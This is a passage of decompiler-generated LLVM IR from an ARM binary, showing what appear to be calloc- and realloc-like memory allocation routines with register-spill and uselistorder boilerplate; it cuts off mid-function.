  %v0_1192c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1192c, i32* %r0.global-to-local, align 4
  store i32 %v3_11038, i32* @r4, align 4
  store i32 %v6_11038, i32* @r5, align 4
  store i32 %v9_11038, i32* @r6, align 4
  store i32 %v12_11038, i32* @r7, align 4
  store i32 %v15_11038, i32* @r8, align 4
  store i32 %v18_11038, i32* @sb, align 4
  store i32 %v21_11038, i32* @sl, align 4
  store i32 %v24_11038, i32* @fp, align 4
  store i32 %v27_11038, i32* @lr, align 4
  ret i32 %v0_1192c

; uselistorder directives
  uselistorder i32 %v0_118d8, { 1, 0, 2 }
  uselistorder i32 %v3_118c0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_118bc, { 1, 0 }
  uselistorder i32 %v2_118a0, { 2, 0, 1, 3 }
  uselistorder i32 %v4_11898, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_11850, { 1, 2, 0 }
  uselistorder i32 %v0_11818, { 1, 0 }
  uselistorder i32 %v0_1180c, { 1, 0 }
  uselistorder i32 %v2_117fc, { 1, 0 }
  uselistorder i32 %v2_1178c, { 2, 1, 0 }
  uselistorder i32 %v2_11774, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1176c, { 1, 0, 2 }
  uselistorder i32 %v1_11768, { 2, 1, 0 }
  uselistorder i32 %v0_11768, { 3, 1, 2, 0 }
  uselistorder i32 %v1_1174c, { 1, 0 }
  uselistorder i32 %v2_11724, { 1, 0 }
  uselistorder i32 %v3_11718, { 1, 0, 2 }
  uselistorder i32 %v2_116f8, { 1, 0, 2 }
  uselistorder i32* %v2_116f0, { 1, 0, 2 }
  uselistorder i32 %v0_116d8, { 1, 0 }
  uselistorder i32 %v6_116b4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_116a0, { 2, 1, 0 }
  uselistorder i32 %v0_11688, { 1, 0 }
  uselistorder i32 %v2_11644, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11640, { 1, 0 }
  uselistorder i32 %v3_11618, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_115f8, { 1, 0, 2 }
  uselistorder i32 %v2_115e0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_11588, { 2, 1, 0 }
  uselistorder i32 %v6_1157c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_11558, { 2, 1, 0, 3 }
  uselistorder i32 %v3_11518, { 1, 0, 2, 3 }
  uselistorder i32 %v0_114d8, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_114d0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_114cc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_114b8, { 1, 0 }
  uselistorder i32 %v7_11478, { 1, 0 }
  uselistorder i32 %v4_11478, { 1, 0 }
  uselistorder i32 %v0_11448, { 1, 0 }
  uselistorder i32 %v2_1141c, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1141854, { 1, 0 }
  uselistorder i32 %v1_113e4, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_113cc., { 1, 2, 0 }
  uselistorder i32 %v0_113d4, { 0, 1, 3, 2 }
  uselistorder i32 %v1_113d4, { 1, 0 }
  uselistorder i32 %v3_113b4, { 1, 0 }
  uselistorder i32 %v4_113b0, { 1, 0, 2 }
  uselistorder i32 %v1_11320, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11378, { 1, 0 }
  uselistorder i32 %v1_1135c, { 1, 0 }
  uselistorder i32 %v1_111fc, { 1, 0 }
  uselistorder i32 %v0_1133c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_11304, { 2, 0, 1, 3 }
  uselistorder i32 %v0_11398.pre, { 1, 2, 0 }
  uselistorder i32 %v0_112e0, { 2, 1, 0 }
  uselistorder i32 %v3_112d4, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_111f4, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1129c, { 1, 0 }
  uselistorder i32 %v3_11290, { 1, 0 }
  uselistorder i32 %v0_1129c, { 1, 0 }
  uselistorder i32 %v3_11274, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11264, { 1, 0, 2 }
  uselistorder i32 %v3_1121c, { 2, 1, 0 }
  uselistorder i32 %v0_1120c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_111dc, { 1, 0 }
  uselistorder i32 %v1_11190, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1118c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_11130, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_11124, { 1, 0 }
  uselistorder i32 %v3_110f4, { 1, 0 }
  uselistorder i32 %v0_110e8, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_110c8, { 0, 2, 1, 3 }
  uselistorder i1 %v7_110bc, { 1, 0 }
  uselistorder i32 %v0_11094, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 41, 38, 39, 40, 42, 43, 44, 45, 107, 108, 46, 47, 48, 49, 50, 51, 52, 53, 54, 59, 55, 56, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 79, 87, 74, 75, 76, 77, 78, 80, 81, 82, 83, 109, 84, 85, 86, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 7, 5, 29, 6, 8, 9, 1, 21, 13, 10, 22, 11, 12, 15, 14, 19, 16, 23, 18, 17, 24, 20, 0, 26, 25, 27, 4, 28, 30, 35, 31, 32, 3, 33, 34, 36, 37, 38, 41, 42, 39, 40, 47, 44, 43, 45, 46, 48, 57, 49, 50, 51, 52, 2, 53, 56, 55, 54 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_13320, { 1, 0 }
  uselistorder i32 (i32)* @function_10fc0, { 1, 0 }
  uselistorder label %dec_label_pc_1192c, { 1, 0 }
  uselistorder label %dec_label_pc_11910, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1190c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_118fc, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_11890, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1180c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_11804, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_116d8, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_1160c, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_114c4, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_11418, { 1, 0 }
  uselistorder label %dec_label_pc_11420.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_113e4, { 1, 0 }
  uselistorder label %dec_label_pc_11398, { 1, 0 }
  uselistorder label %dec_label_pc_1132c, { 1, 0 }
  uselistorder label %dec_label_pc_11328, { 1, 0 }
  uselistorder label %dec_label_pc_112d4, { 1, 0 }
  uselistorder label %dec_label_pc_112c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11288, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11274, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_11940(i32 %arg1) local_unnamed_addr {
dec_label_pc_11940:
  %v0_11940 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11940, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_11940
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11940, %bb
  %v10_11954 = phi i32 [ %arg1, %dec_label_pc_11940 ], [ 0, %bb ]
  ret i32 %v10_11954

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_11958(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11958:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_11958 = load i32, i32* @r4, align 4
  %v6_11958 = load i32, i32* @r5, align 4
  %v9_11958 = load i32, i32* @r6, align 4
  %v12_11958 = load i32, i32* @lr, align 4
  %v2_11960 = icmp eq i32 %arg1, 0
  store i32 123764, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_11970 = mul i32 %arg2, %arg1
  store i32 %v2_11970, i32* @r6, align 4
  br i1 %v2_11960, label %dec_label_pc_119a0, label %dec_label_pc_11978

dec_label_pc_11978:                               ; preds = %dec_label_pc_11958
  store i32 %arg1, i32* @r1, align 4
  store i32 %v2_11970, i32* @r0, align 4
  %v0_11980 = call i32 @function_ff2c()
  %v0_11984 = load i32, i32* @r4, align 4
  %v9_11984 = icmp eq i32 %v0_11984, %v0_11980
  br i1 %v9_11984, label %dec_label_pc_11978.dec_label_pc_119a0_crit_edge, label %dec_label_pc_1198c

dec_label_pc_11978.dec_label_pc_119a0_crit_edge:  ; preds = %dec_label_pc_11978
  %v0_119a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_119a0

dec_label_pc_1198c:                               ; preds = %dec_label_pc_11978
  %v0_1198c = call i32 @function_10a30()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_11998 = inttoptr i32 %v0_1198c to i32*
  store i32 12, i32* %v2_11998, align 4
  br label %dec_label_pc_11a64

dec_label_pc_119a0:                               ; preds = %dec_label_pc_11978.dec_label_pc_119a0_crit_edge, %dec_label_pc_11958
  %v0_119bc = phi i32 [ %v0_119a4.pre, %dec_label_pc_11978.dec_label_pc_119a0_crit_edge ], [ 123764, %dec_label_pc_11958 ]
  %v2_119a4 = add i32 %v0_119bc, 68
  %v3_119a4 = inttoptr i32 %v2_119a4 to i32*
  %v4_119a4 = load i32, i32* %v3_119a4, align 4
  store i32 %v4_119a4, i32* @r4, align 4
  %v2_119bc = add i32 %v0_119bc, 72
  %v3_119bc = inttoptr i32 %v2_119bc to i32*
  %v4_119bc = load i32, i32* %v3_119bc, align 4
  store i32 %v4_119bc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_119bc)
  %v0_119d0 = load i32, i32* @r5, align 4
  %v2_119d0 = add i32 %v0_119d0, 16
  %v3_119d0 = inttoptr i32 %v2_119d0 to i32*
  %v4_119d0 = load i32, i32* %v3_119d0, align 4
  store i32 %v4_119d0, i32* %ip.global-to-local, align 4
  store i32 72156, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_119d0)
  %v0_119dc = load i32, i32* @r6, align 4
  store i32 %v0_119dc, i32* @r0, align 4
  %v0_119e0 = call i32 @function_11038()
  store i32 %v0_119e0, i32* %r4.global-to-local, align 4
  %v2_119e4 = icmp eq i32 %v0_119e0, 0
  br i1 %v2_119e4, label %.thread, label %dec_label_pc_119ec

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119a0
  %v1_119ec = add i32 %v0_119e0, -4
  %v2_119ec = inttoptr i32 %v1_119ec to i32*
  %v3_119ec = load i32, i32* %v2_119ec, align 4
  %v1_119f0 = and i32 %v3_119ec, 2
  %v2_119f0 = icmp eq i32 %v1_119f0, 0
  br i1 %v2_119f0, label %dec_label_pc_119f8, label %.thread

dec_label_pc_119f8:                               ; preds = %dec_label_pc_119ec
  %v1_119f87 = add i32 %v3_119ec, -4
  %v1_119fc = and i32 %v1_119f87, -4
  store i32 %v1_119fc, i32* @r2, align 4
  %v3_11a00 = udiv i32 %v1_119fc, 4
  store i32 %v3_11a00, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_119fc, 36
  %v2_11a08 = icmp ult i32 %v1_119fc, 33
  %v3_11a08 = or i1 %tmp, %v2_11a08
  br i1 %v3_11a08, label %dec_label_pc_11a14, label %dec_label_pc_11a0c

dec_label_pc_11a0c:                               ; preds = %dec_label_pc_119f8
  %v2_11a0c = inttoptr i32 %v0_119e0 to i8*
  %v3_11a0c = call i32 @function_10a80(i8* %v2_11a0c, i32 0)
  br label %.thread

dec_label_pc_11a14:                               ; preds = %dec_label_pc_119f8
  %tmp8 = icmp eq i32 %v1_119fc, 16
  %v2_11a18 = inttoptr i32 %v0_119e0 to i32*
  store i32 0, i32* %v2_11a18, align 4
  %v1_11a1c = load i32, i32* %r4.global-to-local, align 4
  %v2_11a1c = add i32 %v1_11a1c, 4
  %v3_11a1c = inttoptr i32 %v2_11a1c to i32*
  store i32 0, i32* %v3_11a1c, align 4
  %v1_11a20 = load i32, i32* %r4.global-to-local, align 4
  %v2_11a20 = add i32 %v1_11a20, 8
  %v3_11a20 = inttoptr i32 %v2_11a20 to i32*
  store i32 0, i32* %v3_11a20, align 4
  %v2_11a24 = icmp ult i32 %v1_119fc, 13
  %v3_11a24 = or i1 %tmp8, %v2_11a24
  br i1 %v3_11a24, label %.thread, label %dec_label_pc_11a28

dec_label_pc_11a28:                               ; preds = %dec_label_pc_11a14
  %v0_11a28 = load i32, i32* %ip.global-to-local, align 4
  %v1_11a2c = load i32, i32* %r4.global-to-local, align 4
  %v2_11a2c = add i32 %v1_11a2c, 12
  %v3_11a2c = inttoptr i32 %v2_11a2c to i32*
  store i32 0, i32* %v3_11a2c, align 4
  %v1_11a30 = load i32, i32* %r4.global-to-local, align 4
  %v2_11a30 = add i32 %v1_11a30, 16
  %v3_11a30 = inttoptr i32 %v2_11a30 to i32*
  store i32 0, i32* %v3_11a30, align 4
  %tmp9 = icmp ult i32 %v0_11a28, 7
  br i1 %tmp9, label %.thread, label %dec_label_pc_11a38

dec_label_pc_11a38:                               ; preds = %dec_label_pc_11a28
  %v0_11a38 = load i32, i32* %ip.global-to-local, align 4
  %v7_11a38 = icmp eq i32 %v0_11a38, 9
  %v1_11a3c = load i32, i32* %r4.global-to-local, align 4
  %v2_11a3c = add i32 %v1_11a3c, 20
  %v3_11a3c = inttoptr i32 %v2_11a3c to i32*
  store i32 0, i32* %v3_11a3c, align 4
  %v1_11a40 = load i32, i32* %r4.global-to-local, align 4
  %v2_11a40 = add i32 %v1_11a40, 24
  %v3_11a40 = inttoptr i32 %v2_11a40 to i32*
  store i32 0, i32* %v3_11a40, align 4
  br i1 %v7_11a38, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11a38
  %v2_11a44 = load i32, i32* %r4.global-to-local, align 4
  %v3_11a44 = add i32 %v2_11a44, 32
  %v4_11a44 = inttoptr i32 %v3_11a44 to i32*
  store i32 0, i32* %v4_11a44, align 4
  %v2_11a48 = load i32, i32* %r4.global-to-local, align 4
  %v3_11a48 = add i32 %v2_11a48, 28
  %v4_11a48 = inttoptr i32 %v3_11a48 to i32*
  store i32 0, i32* %v4_11a48, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11a38, %dec_label_pc_119ec, %dec_label_pc_11a28, %dec_label_pc_11a14, %dec_label_pc_119a0, %dec_label_pc_11a0c, %bb
  %v0_11a58 = load i32, i32* @r5, align 4
  %v2_11a58 = add i32 %v0_11a58, 24
  %v3_11a58 = inttoptr i32 %v2_11a58 to i32*
  %v4_11a58 = load i32, i32* %v3_11a58, align 4
  store i32 %v4_11a58, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_11a58)
  br label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %dec_label_pc_1198c, %.thread
  %v0_11a64 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_11958, i32* @r4, align 4
  store i32 %v6_11958, i32* @r5, align 4
  store i32 %v9_11958, i32* @r6, align 4
  store i32 %v12_11958, i32* @lr, align 4
  ret i32 %v0_11a64

; uselistorder directives
  uselistorder i32 %v1_119fc, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v0_119e0, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 33, { 0, 2, 9, 1, 10, 3, 4, 5, 6, 11, 7, 12, 8, 13 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11a64, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_11a78(i32 %arg1) local_unnamed_addr {
dec_label_pc_11a78:
  %v0_11a78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11a78, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11a78
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11a78, %bb
  %v10_11a88 = phi i32 [ %arg1, %dec_label_pc_11a78 ], [ 0, %bb ]
  ret i32 %v10_11a88

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_11a8c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11a8c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11a8c = load i32, i32* @r4, align 4
  %v6_11a8c = load i32, i32* @r5, align 4
  %v9_11a8c = load i32, i32* @r6, align 4
  %v12_11a8c = load i32, i32* @r7, align 4
  %v15_11a8c = load i32, i32* @r8, align 4
  %v18_11a8c = load i32, i32* @sb, align 4
  %v21_11a8c = load i32, i32* @sl, align 4
  %v24_11a8c = load i32, i32* @fp, align 4
  %v27_11a8c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_11a98 = icmp eq i32* %arg1, null
  store i32 123764, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_11a98, label %dec_label_pc_11aac, label %dec_label_pc_11abc

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11a8c
  store i32 %arg2, i32* @r0, align 4
  %v0_11ab0 = call i32 @function_11038()
  store i32 %v0_11ab0, i32* %r0.global-to-local, align 4
  store i32 %v0_11ab0, i32* @r4, align 4
  br label %dec_label_pc_11e14

dec_label_pc_11abc:                               ; preds = %dec_label_pc_11a8c
  %v2_11abc = icmp eq i32 %arg2, 0
  br i1 %v2_11abc, label %dec_label_pc_11ac4, label %dec_label_pc_11ad0

dec_label_pc_11ac4:                               ; preds = %dec_label_pc_11abc
  %v0_11ac4 = call i32 @function_120a4()
  store i32 %v0_11ac4, i32* %r0.global-to-local, align 4
  %v0_11ac8 = load i32, i32* @r6, align 4
  store i32 %v0_11ac8, i32* @r4, align 4
  br label %dec_label_pc_11e14

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11abc
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_11ad8 = load i32, i32* inttoptr (i32 123832 to i32*), align 8
  store i32 %v4_11ad8, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_11ad8, i32* %r2.global-to-local, align 4
  %v4_11ae4 = load i32, i32* inttoptr (i32 123800 to i32*), align 8
  store i32 %v4_11ae4, i32* %r1.global-to-local, align 4
  %v2_11ae8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_11ae8, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_11af0 = load i32, i32* inttoptr (i32 123836 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11af0)
  %v0_11afc = load i32, i32* @r4, align 4
  store i32 %v0_11afc, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r1.global-to-local, align 4
  %v4_11b08 = load i32, i32* inttoptr (i32 123780 to i32*), align 4
  store i32 %v4_11b08, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11b14.404 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11b08)
  %v0_11b14 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_11b14, -32
  br i1 %tmp36, label %dec_label_pc_11b30, label %dec_label_pc_11b1c

dec_label_pc_11b1c:                               ; preds = %dec_label_pc_11ad0
  %v0_11b1c = call i32 @function_10a30()
  store i32 %v0_11b1c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_11b28 = inttoptr i32 %v0_11b1c to i32*
  store i32 12, i32* %v2_11b28, align 4
  br label %dec_label_pc_11e14

dec_label_pc_11b30:                               ; preds = %dec_label_pc_11ad0
  %v1_11b30 = add i32 %v0_11b14, 11
  store i32 %v1_11b30, i32* %r0.global-to-local, align 4
  %v0_11b34 = load i32, i32* @r5, align 4
  %v1_11b34 = add i32 %v0_11b34, -4
  %v2_11b34 = inttoptr i32 %v1_11b34 to i32*
  %v3_11b34 = load i32, i32* %v2_11b34, align 4
  store i32 %v3_11b34, i32* %r2.global-to-local, align 4
  %v2_11b38 = icmp ugt i32 %v1_11b30, 14
  %v7_11b38 = icmp eq i32 %v1_11b30, 15
  %v2_11b3c = xor i1 %v2_11b38, true
  %v3_11b3c = or i1 %v7_11b38, %v2_11b3c
  br i1 %v3_11b3c, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_11b30
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_11b30, %bb
  %v2_11b40 = xor i1 %v7_11b38, true
  %v3_11b40 = and i1 %v2_11b38, %v2_11b40
  br i1 %v3_11b40, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_11b40 = and i32 %v1_11b30, -8
  store i32 %v5_11b40, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_11b44 = and i32 %v3_11b34, 2
  %v2_11b44 = icmp eq i32 %v1_11b44, 0
  %v1_11b48 = add i32 %v0_11b34, -8
  store i32 %v1_11b48, i32* @sl, align 4
  %v1_11b4c = and i32 %v3_11b34, -4
  store i32 %v1_11b4c, i32* @r6, align 4
  br i1 %v2_11b44, label %dec_label_pc_11b54, label %dec_label_pc_11d2c

dec_label_pc_11b54:                               ; preds = %bb29
  %v1_11b54 = load i32, i32* @sb, align 4
  %v3_11b54 = icmp ult i32 %v1_11b4c, %v1_11b54
  br i1 %v3_11b54, label %dec_label_pc_11b60, label %bb30

bb30:                                             ; preds = %dec_label_pc_11b54
  store i32 %v1_11b4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cc4

dec_label_pc_11b60:                               ; preds = %dec_label_pc_11b54
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_11b68 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_11b68, i32* %r0.global-to-local, align 4
  %v1_11b6c = add i32 %v4_11b68, 44
  %v2_11b6c = inttoptr i32 %v1_11b6c to i32*
  %v3_11b6c = load i32, i32* %v2_11b6c, align 4
  store i32 %v3_11b6c, i32* %r3.global-to-local, align 4
  %v2_11b70 = add i32 %v1_11b4c, %v1_11b48
  store i32 %v2_11b70, i32* @r4, align 4
  %v9_11b74 = icmp eq i32 %v2_11b70, %v3_11b6c
  %v1_11b78 = add i32 %v2_11b70, 4
  %v2_11b78 = inttoptr i32 %v1_11b78 to i32*
  %v3_11b78 = load i32, i32* %v2_11b78, align 4
  store i32 %v3_11b78, i32* %r1.global-to-local, align 4
  br i1 %v9_11b74, label %dec_label_pc_11b80, label %dec_label_pc_11bbc

dec_label_pc_11b80:                               ; preds = %dec_label_pc_11b60
  %v1_11b80 = and i32 %v3_11b78, -4
  %v2_11b84 = add i32 %v1_11b80, %v1_11b4c
  store i32 %v2_11b84, i32* %r1.global-to-local, align 4
  %v1_11b88 = add i32 %v1_11b54, 16
  store i32 %v1_11b88, i32* %r3.global-to-local, align 4
  %v3_11b8c = icmp ult i32 %v2_11b84, %v1_11b88
  br i1 %v3_11b8c, label %dec_label_pc_11c10, label %dec_label_pc_11b94

dec_label_pc_11b94:                               ; preds = %dec_label_pc_11b80
  %v2_11b94 = sub i32 %v2_11b84, %v1_11b54
  %v1_11b98 = urem i32 %v3_11b34, 2
  %v2_11b9c = add i32 %v1_11b54, %v1_11b48
  store i32 %v2_11b9c, i32* %r1.global-to-local, align 4
  %v2_11ba0 = or i32 %v1_11b54, %v1_11b98
  store i32 %v2_11ba0, i32* %r2.global-to-local, align 4
  %v1_11ba4 = or i32 %v2_11b94, 1
  store i32 %v1_11ba4, i32* %r3.global-to-local, align 4
  store i32 %v0_11b34, i32* @r4, align 4
  store i32 %v2_11ba0, i32* %v2_11b34, align 4
  %v0_11bb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11bb0 = load i32, i32* %r0.global-to-local, align 4
  %v2_11bb0 = add i32 %v1_11bb0, 44
  %v3_11bb0 = inttoptr i32 %v2_11bb0 to i32*
  store i32 %v0_11bb0, i32* %v3_11bb0, align 4
  %v0_11bb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_11bb4 = load i32, i32* %r1.global-to-local, align 4
  %v2_11bb4 = add i32 %v1_11bb4, 4
  %v3_11bb4 = inttoptr i32 %v2_11bb4 to i32*
  store i32 %v0_11bb4, i32* %v3_11bb4, align 4
  br label %dec_label_pc_11df8

dec_label_pc_11bbc:                               ; preds = %dec_label_pc_11b60
  %v1_11bbc = and i32 %v3_11b78, -2
  %v2_11bc0 = add i32 %v1_11bbc, %v2_11b70
  store i32 %v2_11bc0, i32* %r3.global-to-local, align 4
  %v1_11bc4 = add i32 %v2_11bc0, 4
  %v2_11bc4 = inttoptr i32 %v1_11bc4 to i32*
  %v3_11bc4 = load i32, i32* %v2_11bc4, align 4
  store i32 %v3_11bc4, i32* %r3.global-to-local, align 4
  %v1_11bc8 = urem i32 %v3_11bc4, 2
  %v2_11bc8 = icmp eq i32 %v1_11bc8, 0
  br i1 %v2_11bc8, label %dec_label_pc_11bd0, label %dec_label_pc_11c10

dec_label_pc_11bd0:                               ; preds = %dec_label_pc_11bbc
  %v1_11bd0 = and i32 %v3_11b78, -4
  store i32 %v1_11bd0, i32* %r3.global-to-local, align 4
  %v2_11bd4 = add i32 %v1_11bd0, %v1_11b4c
  store i32 %v2_11bd4, i32* %r0.global-to-local, align 4
  %v3_11bd8 = icmp ult i32 %v2_11bd4, %v1_11b54
  br i1 %v3_11bd8, label %dec_label_pc_11c10, label %dec_label_pc_11be0

dec_label_pc_11be0:                               ; preds = %dec_label_pc_11bd0
  %v1_11be0 = add i32 %v1_11b4c, %v0_11b34
  %v2_11be0 = inttoptr i32 %v1_11be0 to i32*
  %v3_11be0 = load i32, i32* %v2_11be0, align 4
  store i32 %v3_11be0, i32* %r1.global-to-local, align 4
  %v1_11be4 = add i32 %v3_11be0, 12
  %v2_11be4 = inttoptr i32 %v1_11be4 to i32*
  %v3_11be4 = load i32, i32* %v2_11be4, align 4
  store i32 %v3_11be4, i32* %r3.global-to-local, align 4
  %v9_11be8 = icmp eq i32 %v3_11be4, %v2_11b70
  %v1_11bec = add i32 %v2_11b70, 12
  %v2_11bec = inttoptr i32 %v1_11bec to i32*
  %v3_11bec = load i32, i32* %v2_11bec, align 4
  store i32 %v3_11bec, i32* %r2.global-to-local, align 4
  br i1 %v9_11be8, label %dec_label_pc_11bf4, label %dec_label_pc_11c00

dec_label_pc_11bf4:                               ; preds = %dec_label_pc_11be0
  %v1_11bf4 = add i32 %v3_11bec, 8
  %v2_11bf4 = inttoptr i32 %v1_11bf4 to i32*
